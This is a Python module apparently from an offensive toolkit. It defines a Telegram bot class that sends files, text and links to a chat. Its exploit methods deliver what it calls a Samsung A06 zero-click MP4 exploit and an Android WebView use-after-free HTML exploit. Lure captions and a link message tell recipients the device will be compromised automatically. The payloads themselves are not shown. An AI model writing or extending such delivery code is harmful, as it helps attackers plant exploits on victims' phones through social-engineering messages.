# core/delivery.py — Both Methods (Document + Video Fallback)

import os
import time
import requests
import mimetypes

class TelegramDelivery:
    def __init__(self, bot_token: str, chat_id: str):
        self.token = bot_token
        self.chat_id = chat_id
        self.api_url = f"https://api.telegram.org/bot{self.token}"
    
    # ============ METHOD 1: SEND AS DOCUMENT (ALWAYS WORKS) ============
    def send_document(self, file_path: str, caption: str = "") -> bool:
        """Send any file as document — always works on Telegram"""
        url = f"{self.api_url}/sendDocument"
        
        try:
            with open(file_path, 'rb') as f:
                files = {'document': f}
                data = {
                    'chat_id': self.chat_id,
                    'caption': caption,
                }
                r = requests.post(url, files=files, data=data, timeout=60)
                if r.status_code == 200:
                    print(f"[+] Document sent: {file_path}")
                    return True
                else:
                    print(f"[-] Document failed: {r.text}")
                    return False
        except Exception as e:
            print(f"[!] Send document error: {e}")
            return False
    
    # ============ METHOD 2: SEND AS VIDEO (FALLBACK) ============
    def send_video(self, video_path: str, caption: str = "") -> bool:
        """Send as video — may fail on malformed MP4"""
        url = f"{self.api_url}/sendVideo"
        
        try:
            with open(video_path, 'rb') as f:
                files = {'video': f}
                data = {
                    'chat_id': self.chat_id,
                    'caption': caption,
                    'supports_streaming': False,
                }
                r = requests.post(url, files=files, data=data, timeout=60)
                if r.status_code == 200:
                    print(f"[+] Video sent: {video_path}")
                    return True
                else:
                    print(f"[-] Video failed: {r.text}")
                    return False
        except Exception as e:
            print(f"[!] Send video error: {e}")
            return False
    
    # ============ COMBINED: VIDEO FIRST, FALLBACK TO DOCUMENT ============
    def send_media(self, file_path: str, caption: str = "", try_video: bool = True) -> bool:
        """
        Send media with video first, fallback to document
        
        Args:
            file_path: Path to file
            caption: Caption for the message
            try_video: Try sending as video first (fallback to document)
        """
        # Try video first if requested
        if try_video:
            print("[+] Trying video delivery...")
            success = self.send_video(file_path, caption)
            if success:
                return True
            print("[!] Video failed, falling back to document...")
        
        # Fallback to document
        print("[+] Sending as document...")
        return self.send_document(file_path, caption)
    
    # ============ TEXT MESSAGES ============
    def send_text(self, text: str, parse_mode: str = "HTML") -> bool:
        """Send text message"""
        url = f"{self.api_url}/sendMessage"
        try:
            r = requests.post(url, data={
                'chat_id': self.chat_id,
                'text': text,
                'parse_mode': parse_mode
            }, timeout=10)
            return r.status_code == 200
        except:
            return False
    
    def send_link(self, text: str, link: str) -> bool:
        """Send text with clickable link"""
        message = f"{text}\n\n🔗 <a href='{link}'>Click here to view</a>"
        return self.send_text(message)
    
    # ============ EXPLOIT DELIVERY ============
    def deliver_samsung(self, mp4_data: bytes) -> bool:
        """Deliver Samsung MP4 exploit — video first, fallback to document"""
        temp = "/tmp/samsung_exploit.mp4"
        with open(temp, 'wb') as f:
            f.write(mp4_data)
        
        caption = """🔥 SAMSUNG A06 EXPLOIT 🔥

📱 Target: Samsung A06
🎯 CVE-2026-0006 — Zero-Click RCE
🇪🇹 Made in Ethiopia

*Tap to view* 👇"""
        
        # Use combined method: video first, fallback to document
        success = self.send_media(temp, caption, try_video=True)
        
        # Clean up
        try:
            os.remove(temp)
        except:
            pass
        
        return success
    
    def deliver_webview(self, html_data: bytes) -> bool:
        """Deliver HTML exploit — always as document"""
        temp = "/tmp/webview_exploit.html"
        with open(temp, 'wb') as f:
            f.write(html_data)
        
        caption = """🔥 WEBVIEW EXPLOIT 🔥

📱 All Android devices
🎯 CVE-2026-7342 — Use-After-Free RCE

*Download and open in browser* 👇"""
        
        # Only document — HTML files can't be sent as video
        success = self.send_document(temp, caption)
        
        try:
            os.remove(temp)
        except:
            pass
        
        return success
    
    # ============ DIRECT LINK METHOD (ALTERNATIVE) ============
    def deliver_link(self, url: str) -> bool:
        """Send a direct link instead of file"""
        text = f"""🔥 SAMSUNG A06 ZEROCLICK 🔥

Click the link below to trigger the exploit:

🔗 <a href='{url}'>Tap here to view</a>

This will compromise the device automatically.
No interaction needed. """
        
        return self.send_text(text)